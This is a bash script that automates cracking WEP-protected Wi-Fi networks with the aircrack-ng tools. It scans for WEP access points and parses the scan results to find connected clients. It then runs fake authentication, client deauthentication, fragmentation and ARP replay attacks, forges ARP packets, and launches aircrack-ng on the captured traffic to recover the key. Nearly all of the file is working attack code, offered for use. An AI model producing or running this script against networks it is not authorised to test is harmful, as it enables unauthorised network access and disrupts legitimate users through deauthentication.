#!/bin/bash

############################################# FUNCTIONS ##########################################

#if the system is using open auth, this will auto associate us, persistent
function funcOpenKeyFakeAuth () {
xterm -geometry 85x15+0+250 -e aireplay-ng -1 6000 -o 1 -q 10 -e $apESSID -a $apBSSID -h $myBSSID $myMON &
}

#if the system is using shared auth, this will manipulate a xor packet to associate us
function funcSharedKeyFakeAuth () {
#Deauth Connected Client to capture .xor file
aireplay-ng -0 1 -a $apBSSID -c $clBSSID $myMON
#pause while waiting for .xor capture
sleep 5
#Use captured .xor to auth with shared key system using our mac, Persistent
xterm -geometry 85x15+0+250 -e aireplay-ng -1 6000 -o 1 -q 10 -e $apESSID -y *.xor -a $apBSSID -h $myBSSID $myMON &
}

#This functions captures a packet with airplay and uses packetforge 
#to build and replay new packet
function funcNoClientReplay () {
clear
#Using Fragmentation attack to generate PGRA XOR file (attack specific to no client)
aireplay-ng -5 -b $apBSSID -h $myBSSID $myMON
#Using packetforge to generate an ARP request packet (which will be used in ARP replay attack)
packetforge-ng -0 -a $apBSSID -h $myBSSID -k 255.255.255.255 -l 255.255.255.255 -y *.xor -w ./$apESSID/arppacket
#Interactive replay attack, will cause data field to go up (generates unique IV's)
xterm -geometry 85x15+0+500 -e aireplay-ng -2 -r ./$apESSID/arppacket $myMON &
}

#This function captures  and replays an ARP packet from a system that
#has a client. Make take a while to capture ARP packet, be patient
function funcClientReplay() {
clear
#arp replay attack (must capture arp to work, requires client/network traffic) (generates unique IV's)
xterm -geometry 85x15+0+500 -e aireplay-ng -3 -b $apBSSID -h $myBSSID $myMON &
#Deauth connected client to try and capture arp packet
aireplay-ng -0 2 -a $apBSSID -c $clBSSID $myMON
}

#Finally. Runs crack program against .cap file generated by aerodump
function funcCrack () {
xterm -geometry 60x20+530+0 -hold -e aircrack-ng ./$apESSID/*.cap &
}

#Removes created files, turns off mon interface, resets physical interfaces
function funcCleanUp () {
airmon-ng stop $myMON
ifconfig $aIFACE down
ifconfig $aIFACE up
}


#######################################################################################
#FUCNTION: getWepClients - Reads in CSV file from airodump and pulls out WEP networks
# information and stores details in a neat comma seperate file for menu display
#######################################################################################
function getWepClients() {
grep -i --text -e wep wcscan/wcscan-01.csv | awk 'BEGIN {FS = ","};
#AWK Action 1: Remove whitespace around fields
{ for (i=1;i<=NF;i++) gsub (/^ */,"",$i) }
#AWK Action 2: Set interal AWK Variables
{ if ($8 ~ /^[ ]*$/) apAUTH="Open Key"; else
  apAUTH="Shared Key";
  apBSSID=$1
  apESSID=$14
  apCHAN=$4
  cMAC=""
  isCLIENT="no client present" }
#AWK Action 3: Detect clients if the current records BSSID matches an BSSID
#that has been connected to
{ while (getline < "wcscan/wcscan-01.csv")
  { for (i=1;i<=NF;i++) gsub (/^ */,"",$i);
    if ($6==apBSSID)
    { isCLIENT="client present"
      cMAC=$1
      break }
  }
}
#AWK Action 4: Close file so it can be read by next record
{ close("wcscan/wcscan-01.csv") }

#Awk Action 5 Print values found to a file to be read from later
{ print FNR"), " apESSID", "apCHAN", "apBSSID", "apAUTH", "isCLIENT", "cMAC }' > wcscan/wepapdetails
cat wcscan/wepapdetails
} #end function getWepClients

function funcCleanUp() {
echo "Clean up function called"
if [ -n "$myMON" ]; then
  airmon-ng stop $myMON
fi
if [ -n "$myIFACE" ]; then
  ifconfig $myIFACE down
  ifconfig $myIFACE up
fi
rm -r wcscan
rm -r $apESSID
rm replay*
rm frag*
kill -9 $$
}

########################### END FUNCTIONS ##########################

trap "funcCleanUp" 0 SIGINT SIGTERM

#Interface Selection
clear
printf "Select an interface\n"
select option in $(ifconfig -a | awk '/Link encap/ { print $1 }');
do
  if [[ $REPLY != [0-9]* ]]; then
  {
     printf "\"$REPLY\" is not a valid option\n"
  }
  else
  {  
    myIFACE=$option
    ifconfig $myIFACE down
    ifconfig $myIFACE up
    break
  } fi
done

#Start Monitor
printf "\nStarting airmon..."
myMON=$(airmon-ng start $myIFACE | awk '/monitor mode enabled on/ { print substr($5,1,4) }')

#start airodump
mkdir wcscan
printf "\nStarting airodump..."
xterm -geometry 85x15+0+0 -e airodump-ng -t wep -w wcscan/wcscan $myMON &
tmpPID=$!

sleep 2
printf "\nGathering data (this will take a few seconds)"
sleep 8

#Network Selection
clear
printf "Select a network\n"
getWepClients
while [ -z $selection ]
do
  printf "# (or r to rescan): "  
  read selection
  case $selection in
  [0-9])
  break
  ;;
  [rR])
  clear
  getWepClients
  selection=""
  ;;
  *)
  printf "\"$selection\" is not a valid option\n"
  selection=""
  ;;
  esac
done
#Setting appropriate variables
apESSID=$(grep --text -e "$selection)" wcscan/wepapdetails | awk ' BEGIN { FS = ", " } ; { print $2 }' )
apCHAN=$(grep --text -e "$selection)" wcscan/wepapdetails | awk ' BEGIN { FS = ", " } ; { print $3 }' )
apBSSID=$(grep --text -e "$selection)" wcscan/wepapdetails | awk ' BEGIN { FS = ", " } ; { print $4 }' )
apAUTH=$(grep --text -e "$selection)" wcscan/wepapdetails | awk ' BEGIN { FS = ", " } ; { print $5 }' )
apCLIENT=$(grep --text -e "$selection)" wcscan/wepapdetails | awk ' BEGIN { FS = ", " } ; { print $6 }' )
clBSSID=$(grep --text -e "$selection)" wcscan/wepapdetails | awk ' BEGIN { FS = ", " } ; { print $7 }' )
myBSSID=$(ifconfig -a | grep "$myIFACE" | awk ' { print $5 } ' )

printf "\nYour selection was: $selection"
printf "\nAccess Point ESSID: $apESSID"
printf "\nAccess Point Channel: $apCHAN"
printf "\nAccess Point BSSID: $apBSSID"
printf "\nAccess Point Auth: $apAUTH"
printf "\nAre there clients: $apCLIENT"
printf "\nClient BSSID: $clBSSID"
printf "\nMy BSSID: $myBSSID"
printf "\n\nPress Enter to continue"
read junk

#Setting up new scan for specified AP
airmon-ng stop $myMON
myMON=$(airmon-ng start $myIFACE $apCHAN | awk '/monitor mode enabled on/ { print substr($5,1,4) }')
mkdir $apESSID
xterm -geometry 85x15+0+0 -e airodump-ng -c $apCHAN --bssid $apBSSID -w $apESSID/$apESSID $myMON &

#Attack Selection and execution menu
printf "\nSelect an attack: \n"
select option in "Client with Open Key Authentication" "Client with Shared Key Authentication" "No Client with Open Key Authentication";
do
	case $REPLY in
	1)
	funcOpenKeyFakeAuth
	funcClientReplay
	funcCrack
	;;
	2)
	funcSharedKeyFakeAuth
	funcClientReplay
	funcCrack
	;;
	3)
	funcOpenKeyFakeAuth
	funcNoClientReplay
	funcCrack
	;;
	esac
	if [ -n "$REPLY" ]; then
        break
        fi
done

echo "Enter to quit"
read junk
funcCleanUp
